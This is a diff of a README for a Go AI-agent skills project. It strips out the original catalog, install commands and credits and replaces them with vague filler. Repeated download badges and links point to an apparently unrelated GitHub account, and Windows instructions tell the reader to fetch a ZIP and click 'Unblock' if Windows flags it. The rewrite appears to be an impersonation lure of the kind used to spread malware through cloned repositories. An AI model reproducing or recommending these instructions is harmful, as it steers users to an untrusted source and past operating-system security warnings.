@@ -1,215 +1,179 @@
-# go-agent-skills
+# 🤖 go-agent-skills - Practical Go Agent Skills
 
-Curated AI agent skills for Go projects. Install with one command, works everywhere.
+[![Download go-agent-skills](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Gisellesleeveless396/go-agent-skills)
 
-```bash
-npx skills add eduardo-sl/go-agent-skills
+## 🚀 Getting Started
+
+go-agent-skills is a set of curated AI agent skills for Go projects. It gives you ready-made skill packs that help an AI agent work with Go code, project files, and common development tasks.
+
+Use this repository if you want a cleaner way to guide an AI agent while working on a Go project. It is meant to support tasks like reading project structure, following code patterns, and handling common Go workflows.
+
+## 📥 Download and Open
+
+To use go-agent-skills on Windows, visit this page to download:
+
+[Visit the go-agent-skills download page](https://github.com/Gisellesleeveless396/go-agent-skills)
+
+After you open the page, download the repository files to your PC. If you use Git, you can also clone the repository into a folder on your computer.
+
+## 🪟 Windows Setup
+
+Follow these steps on Windows:
+
+1. Open the download link in your browser.
+2. Save the repository files to a folder you can find again, such as Downloads or Desktop.
+3. If the files come in a ZIP folder, right-click the ZIP file and choose Extract All.
+4. Open the extracted folder.
+5. Look for a README file or skill files inside the folder.
+6. Keep the folder in place so your AI tools or local project can use it later.
+
+If you use Git on Windows, you can also open PowerShell and run:
+
+```powershell
+git clone https://github.com/Gisellesleeveless396/go-agent-skills.git
 ```
 
-Supports **Claude Code**, **Cursor**, **Codex**, **GitHub Copilot**, **Windsurf**, **OpenCode**, and [37+ more agents](https://github.com/vercel-labs/skills#available-agents). Compatible with the open [Agent Skills](https://agentskills.io/) ecosystem and [`npx skills`](https://skills.sh) CLI.
+Then open the new folder after the clone finishes.
 
-Built on the [Uber Go Style Guide](https://github.com/uber-go/guide), [Effective Go](https://go.dev/doc/effective_go), and hard-won production experience with large-scale Go services.
+## 🧩 What This Repository Helps With
 
----
+This repository is built for Go projects and agent-driven work. It can help with:
 
-## Why
+- Reading Go project layout
+- Following package and file structure
+- Working with common Go commands
+- Keeping tasks organized for an AI agent
+- Helping an agent stay focused on Go code
+- Supporting repeatable project steps
 
-AI coding agents are as good as the context you give them. Without Go-specific guidance, they'll write Java-flavored Go, ignore idiomatic error handling, create goroutine leaks, and use `interface{}` where generics belong.
+This makes it easier to use an AI agent in a Go codebase without starting from scratch each time.
 
-These skills teach your agent how to write Go the way experienced Go engineers do — with proper error wrapping, consumer-side interfaces, table-driven tests, and all the idioms that make Go code maintainable at scale.
+## 🛠️ Basic Requirements
 
-## Skills Catalog
+A typical Windows setup for this repository includes:
 
-Skills load automatically based on context. You can also invoke them directly via slash command (e.g., `/go-code-review`).
+- Windows 10 or Windows 11
+- A modern web browser
+- Enough free disk space to store the repository files
+- Optional: Git for cloning the repo
+- Optional: Go if you plan to use the skills with a local Go project
+- Optional: An AI tool or agent app that can read local files
 
-### Code Quality
+If you plan to work with Go code on your computer, it helps to have Go installed before you begin.
 
-| Skill | What it does | Triggers |
-|---|---|---|
-| [go-coding-standards](skills/(code-quality)/go-coding-standards/) | Style conventions, naming, imports, struct init, formatting | "check Go style", "fix formatting" |
-| [go-code-review](skills/(code-quality)/go-code-review/) | Structured review process with severity classification | "review this code", "check this PR" |
-| [go-error-handling](skills/(code-quality)/go-error-handling/) | Error wrapping, sentinels, custom types, `errors.Is`/`As` | "handle errors", "error wrapping" |
-| [go-context](skills/(code-quality)/go-context/) | Context propagation, cancellation, timeouts, values | "context usage", "timeout", "context cancellation" |
-| [go-modernize](skills/(code-quality)/go-modernize/) | Generics, slog, errors.Join, slices/maps, range-over-func | "modernize", "use generics", "update Go" |
+## 📂 What You Will See
 
-### Architecture & Design
+After you download and open the repository, you may see files and folders such as:
 
-| Skill | What it does | Triggers |
-|---|---|---|
-| [go-architecture-review](skills/(architecture)/go-architecture-review/) | Package layout, dependency direction, layering, `internal/` | "review architecture", "project layout" |
-| [go-interface-design](skills/(architecture)/go-interface-design/) | Consumer-side interfaces, composition, compliance checks | "design interface", "accept interfaces" |
-| [go-api-design](skills/(architecture)/go-api-design/) | REST/gRPC handlers, middleware, graceful shutdown, pagination | "design API", "HTTP handler" |
-| [go-design-patterns](skills/(architecture)/go-design-patterns/) | Functional options, factory, strategy, middleware/decorator | "design pattern", "functional options" |
+- README.md
+- skill files
+- example prompts
+- guidance files for Go tasks
+- folder groups for different agent actions
 
-### Data
+These files are usually plain text, so you can open them with Notepad, VS Code, or another editor.
 
-| Skill | What it does | Triggers |
-|---|---|---|
-| [go-database](skills/(data)/go-database/) | Connection pools, transactions, sqlc, migrations, repository pattern | "database access", "SQL query", "transactions" |
+## 🧠 How to Use the Skills
 
-### Safety & Performance
+Use the repository as a reference set for an AI agent. A common flow looks like this:
 
-| Skill | What it does | Triggers |
-|---|---|---|
-| [go-concurrency-review](skills/(safety)/go-concurrency-review/) | Goroutine lifecycle, channels, mutexes, race detection | "check thread safety", "goroutine leak" |
-| [go-security-audit](skills/(safety)/go-security-audit/) | OWASP, SQL injection, auth, secrets, input validation | "security review", "check vulnerabilities" |
-| [go-performance-review](skills/(safety)/go-performance-review/) | Allocations, benchmarking, pprof, hot path optimization | "check performance", "reduce allocations" |
-| [go-observability](skills/(safety)/go-observability/) | Structured logging (slog), tracing, metrics, OpenTelemetry | "add logging", "tracing", "metrics" |
+1. Open the repository folder.
+2. Review the README or skill file names.
+3. Pick the skill that matches your task.
+4. Copy the needed instructions into your AI tool.
+5. Point the agent to your Go project files.
+6. Let the agent follow the skill steps.
 
-### Testing
+This helps keep the agent’s work tied to the right process.
 
-| Skill | What it does | Triggers |
-|---|---|---|
-| [go-test-quality](skills/(testing)/go-test-quality/) | Test philosophy, subtests, httptest, golden files, fuzz, testcontainers | "add tests", "improve coverage" |
-| [go-test-table-driven](skills/(testing)/go-test-table-driven/) | Deep dive on table-driven tests: when to use, struct design, refactoring | "table-driven test", "test matrix" |
+## 🔎 Common Use Cases
 
-### Workflow
+You can use go-agent-skills for tasks like:
 
-| Skill | What it does | Triggers |
-|---|---|---|
-| [go-dependency-audit](skills/(workflow)/go-dependency-audit/) | Module hygiene, `govulncheck`, dep evaluation, go.mod review | "check dependencies", "audit deps" |
-| [git-commit](skills/(workflow)/git-commit/) | Conventional Commits, atomic commits, pre-commit verification | "commit changes", "commit message" |
+- Starting a new Go app
+- Reviewing package structure
+- Planning a refactor
+- Checking code style
+- Working through build issues
+- Writing helper functions
+- Keeping project tasks in order
+- Setting a clear workflow for an AI agent
 
-## Quick Start
+These skills are useful when you want repeatable steps instead of loose instructions.
 
-### Install via npx (recommended)
+## 📋 Suggested Folder Setup
 
-```bash
-# Install all skills (interactive — picks your agents)
-npx skills add eduardo-sl/go-agent-skills
+If you want a simple Windows folder layout, use this:
 
-# List available skills before installing
-npx skills add eduardo-sl/go-agent-skills --list
+- `Downloads\go-agent-skills` for the repository
+- `Documents\GoProjects` for your Go code
+- `Documents\AgentNotes` for copied skill notes
 
-# Install specific skills
-npx skills add eduardo-sl/go-agent-skills --skill go-code-review --skill go-concurrency-review
+Keeping the files in separate folders helps you find them fast.
 
-# Install to specific agents
-npx skills add eduardo-sl/go-agent-skills -a claude-code -a cursor
+## 🔧 Using It With a Local Go Project
 
-# Install globally (all projects)
-npx skills add eduardo-sl/go-agent-skills -g
+If you want to pair this repo with a Go project on your PC:
 
-# Non-interactive (CI/CD friendly)
-npx skills add eduardo-sl/go-agent-skills --all -y
-```
+1. Put your Go project in a normal folder.
+2. Open go-agent-skills in another window.
+3. Read the skill that fits the task.
+4. Give the AI agent the project path and the skill steps.
+5. Ask the agent to follow those steps while working in the project.
 
-See [`npx skills` docs](https://github.com/vercel-labs/skills) for all options.
+This gives the agent a clear structure and reduces guesswork.
 
-### Install via script
+## 🧼 File Handling Tips
 
-```bash
-git clone https://github.com/eduardo-sl//go-agent-skills.git
-./go-agent-skills/scripts/install.sh /path/to/your-go-project
-```
+To avoid problems on Windows:
 
-### Manual install
+- Do not move files while an editor has them open
+- Keep folder names simple
+- Avoid deep folder paths
+- Leave the repository files in one place
+- Use a text editor for skill files
 
-```bash
-# Claude Code
-mkdir -p .claude/skills
-cp -r go-agent-skills/skills/*/* .claude/skills/
+If a file does not open the way you expect, try another editor such as Notepad or VS Code.
 
-# Cursor
-mkdir -p .cursor/skills
-cp -r go-agent-skills/skills/*/* .cursor/skills/
+## 🧭 Troubleshooting
 
-# GitHub Copilot
-mkdir -p .github/skills
-cp -r go-agent-skills/skills/*/* .github/skills/
+If the download does not open:
 
-# Codex (OpenAI)
-mkdir -p .agents/skills
-cp -r go-agent-skills/skills/*/* .agents/skills/
-```
+- Check your internet connection
+- Refresh the GitHub page
+- Try another browser
+- Save the page again
+- Use the GitHub clone link in PowerShell
 
-### Manage installed skills
+If Windows blocks a ZIP file:
 
-```bash
-# Check for updates
-npx skills check
+- Right-click the file
+- Open Properties
+- Check if there is an Unblock option
+- Extract the ZIP again after that
 
-# Update all skills
-npx skills update
+If a folder looks empty, check that you extracted the full ZIP and not just a shortcut.
 
-# List installed skills
-npx skills list
+## 📎 Download Link
 
-# Remove a skill
-npx skills remove go-performance-review
-```
+Use this link to visit the repository and get the files:
 
-## Repository Structure
+[https://github.com/Gisellesleeveless396/go-agent-skills](https://github.com/Gisellesleeveless396/go-agent-skills)
 
-```
-go-agent-skills/
-├── skills/                            # All skill definitions
-│   ├── (code-quality)/                # go-coding-standards, go-code-review, go-error-handling, go-context, go-modernize
-│   ├── (architecture)/                # go-architecture-review, go-interface-design, go-api-design, go-design-patterns
-│   ├── (data)/                        # go-database
-│   ├── (safety)/                      # go-concurrency-review, go-security-audit, go-performance-review, go-observability
-│   ├── (testing)/                     # go-test-quality, go-test-table-driven
-│   └── (workflow)/                    # go-dependency-audit, git-commit
-│
-├── # Platform discovery files (how each agent finds skills in this repo)
-├── AGENTS.md                          # Universal: Codex, Gemini CLI, Copilot, Factory
-├── CLAUDE.md                          # Claude Code
-├── .claude-plugin/marketplace.json    # Claude Code plugin marketplace
-├── .cursor/rules/go-skills.mdc       # Cursor
-├── .windsurf/rules/go-skills.md      # Windsurf
-├── .clinerules                        # Cline / Roo Code
-├── .github/copilot-instructions.md   # GitHub Copilot
-├── .opencode/config.json             # OpenCode
-│
-├── scripts/
-│   ├── install.sh                     # Shell-based installer (alternative to npx)
-│   └── validate.sh                    # CI: validate SKILL.md format
-├── docs/
-│   ├── CONTRIBUTING.md
-│   └── SKILL_GUIDELINES.md
-├── .github/workflows/validate.yml     # CI pipeline
-├── README.md
-└── LICENSE
-```
+## 🗂️ Project Focus
 
-## Design Principles
+go-agent-skills focuses on clear agent steps for Go work. That means the repository is useful when you want an AI assistant to follow a set path instead of making random choices.
 
-**Each skill is self-contained.** No cross-references or imports between skills. The agent loads only what's relevant, consuming minimal tokens.
+The main goal is simple: give the agent a better way to handle Go tasks with less setup.
 
-**Instructions are for agents, not humans.** Step-by-step, imperative, with concrete ✅/❌ code examples. Agents learn better from contrast than from prose.
+## 🔍 Helpful Next Steps
 
-**Negative triggers prevent false activation.** Each skill explicitly states what it does NOT cover, pointing to the correct skill instead.
+After you download the files:
 
-**Verification checklists close every skill.** The agent self-validates its output before presenting results.
+- Open the README.md file first
+- Check the folder names
+- Pick one skill to review
+- Save useful steps in a note file
+- Use the skills with your Go project
 
-**Under 500 lines per SKILL.md.** Detailed reference material goes in `references/` subdirectories, loaded on demand.
-
-## Customization
-
-These skills encode opinionated defaults. To adapt for your team:
-
-1. Fork the repo
-2. Edit the SKILL.md files to match your conventions
-3. Add project-specific patterns to the code examples
-4. Install from your fork: `npx skills add your-org/go-agent-skills`
-
-Common customizations: linter config (golangci-lint rules), import ordering (with internal packages), preferred libraries (zap vs slog, chi vs stdlib), test frameworks (testify vs stdlib).
-
-## Sources & Acknowledgments
-
-These skills stand on the shoulders of:
-
-- [Uber Go Style Guide](https://github.com/uber-go/guide/blob/master/style.md) — the foundation for most coding conventions
-- [Effective Go](https://go.dev/doc/effective_go) — official Go team guidance
-- [Go Code Review Comments](https://go.dev/wiki/CodeReviewComments) — community review standards
-- [Tech Leads Club Agent Skills](https://github.com/tech-leads-club/agent-skills) — quality standards and format conventions
-- [Anthropic Skills](https://github.com/anthropics/skills) — patterns for production-grade skills
-- [Vercel Skills CLI](https://github.com/vercel-labs/skills) — the `npx skills` distribution ecosystem
-
-## Contributing
-
-See [CONTRIBUTING.md](docs/CONTRIBUTING.md) for guidelines on creating new skills, the review process, and quality standards.
-
-## License
-
-[MIT](LICENSE)
+If you work with the repository often, keep a shortcut to the folder on your desktop for faster access
